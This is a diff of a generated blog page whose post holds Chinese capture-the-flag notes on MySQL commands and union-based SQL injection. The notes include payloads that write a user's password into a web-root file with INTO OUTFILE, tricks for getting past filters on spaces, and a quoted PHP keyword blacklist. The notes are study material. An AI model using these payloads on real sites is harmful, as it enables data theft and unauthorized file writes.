@@ -20,15 +20,15 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="列出所有数据库 show datebases   查看某个数据库里所有的表 use datebasename show tables from mysql select datebase()#查看当前选择的是哪个库 select version()#查版本 select user(); #查看当前登录用户 select @@datedir; #查看数据路径 select @@basedir; #查">
+  <meta name="description" content="[toc] mysql 指令列出所有数据库 show datebases   查看某个数据库里所有的表 use datebasename show tables from mysql select datebase()#查看当前选择的是哪个库 select version()#查版本 select user(); #查看当前登录用户 select @@datedir; #查看数据路径 select">
 <meta property="og:type" content="article">
 <meta property="og:title" content="zhoupenghao">
 <meta property="og:url" content="http://example.com/2022/12/31/hello-world/index.html">
 <meta property="og:site_name" content="zhpenghao">
-<meta property="og:description" content="列出所有数据库 show datebases   查看某个数据库里所有的表 use datebasename show tables from mysql select datebase()#查看当前选择的是哪个库 select version()#查版本 select user(); #查看当前登录用户 select @@datedir; #查看数据路径 select @@basedir; #查">
+<meta property="og:description" content="[toc] mysql 指令列出所有数据库 show datebases   查看某个数据库里所有的表 use datebasename show tables from mysql select datebase()#查看当前选择的是哪个库 select version()#查版本 select user(); #查看当前登录用户 select @@datedir; #查看数据路径 select">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-12-31T14:43:41.705Z">
-<meta property="article:modified_time" content="2023-01-04T14:58:36.166Z">
+<meta property="article:modified_time" content="2023-01-05T13:41:08.121Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 
@@ -180,7 +180,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-01-04 22:58:36" itemprop="dateModified" datetime="2023-01-04T22:58:36+08:00">2023-01-04</time>
+                <time title="Modified: 2023-01-05 21:41:08" itemprop="dateModified" datetime="2023-01-05T21:41:08+08:00">2023-01-05</time>
               </span>
 
           
@@ -194,7 +194,8 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>列出所有数据库</p>
+        <p>[toc]</p>
+<h1 id="mysql-指令"><a href="#mysql-指令" class="headerlink" title="mysql 指令"></a>mysql 指令</h1><p>列出所有数据库</p>
 <p>show datebases  </p>
 <p>查看某个数据库里所有的表</p>
 <p>use datebasename</p>
@@ -210,9 +211,8 @@
 <p>create table tl(id int);#创建一个表</p>
 <p>drop table tl;#删除一个表</p>
 <p>insert into tl values (1,”zhangsan”)</p>
-<p>sqlmap 指令</p>
-<p>union 联合注入</p>
-<p>1’ union select 1,password from ctfshow_user5 where username&#x3D;’flag’ into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;ctf.txt’ – A#生成并保存在网页目录下ctf.txt文件#ctfshowweb175</p>
+<p>[toc]</p>
+<h2 id="union-联合注入"><a href="#union-联合注入" class="headerlink" title="union 联合注入"></a>union 联合注入</h2><p>1’ union select 1,password from ctfshow_user5 where username&#x3D;’flag’ into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;ctf.txt’ – A#生成并保存在网页目录下ctf.txt文件#ctfshowweb175</p>
 <p>  if(!preg_match(‘&#x2F;[\x00-\x7f]&#x2F;i’, json_encode($ret))){<br>      $ret[‘msg’]&#x3D;’查询成功’;<br>    }<br>sql 字符注入绕过 空格 %09(tab) %20( )注释绕过&#x2F;**&#x2F;%0a%0b%0c</p>
 <p> return preg_match(‘&#x2F; |*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|#|file|into|select&#x2F;i’, $str);<br>%23(#) </p>
 <p>-1’or(id&#x3D;26)and’a’&#x3D;’a           #括号绕过空格 ctfshow180</p>
@@ -232,8 +232,8 @@
     <div class="post-nav">
       <div class="post-nav-item"></div>
       <div class="post-nav-item">
-    <a href="/2023/01/01/My-New-Post/" rel="next" title="My New Post">
-      My New Post <i class="fa fa-chevron-right"></i>
+    <a href="/2023/01/04/sql/" rel="next" title="sql">
+      sql <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -293,6 +293,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#mysql-%E6%8C%87%E4%BB%A4"><span class="nav-number">1.</span> <span class="nav-text">mysql 指令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#union-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.</span> <span class="nav-text">union 联合注入</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -306,7 +307,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">2</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
